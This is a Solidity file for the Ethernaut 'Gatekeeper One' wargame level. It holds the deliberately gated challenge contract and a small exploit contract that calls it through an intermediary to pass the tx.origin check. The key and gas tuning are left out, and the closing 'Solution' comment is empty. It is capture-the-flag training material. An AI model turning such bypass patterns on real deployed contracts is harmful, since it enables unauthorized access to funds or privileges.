// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EthernautThirteenGatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)),
            "GatekeeperOne: invalid gateThree part one"
        );
        require(
            uint32(uint64(_gateKey)) != uint64(_gateKey),
            "GatekeeperOne: invalid gateThree part two"
        );
        require(
            uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)),
            "GatekeeperOne: invalid gateThree part three"
        );
        _;
    }

    function enter(
        bytes8 _gateKey
    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract EthernautThirteenGatekeeperOneExploit {
    EthernautThirteenGatekeeperOne
        private immutable ethernautThirteenGatekeeperOne;

    constructor(EthernautThirteenGatekeeperOne _address) {
        ethernautThirteenGatekeeperOne = EthernautThirteenGatekeeperOne(
            _address
        );
    }

    function exploit(bytes8 gateKey) external {
        ethernautThirteenGatekeeperOne.enter(gateKey);
    }
}

// https://ethernaut.openzeppelin.com/level/0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69

// Solution
//
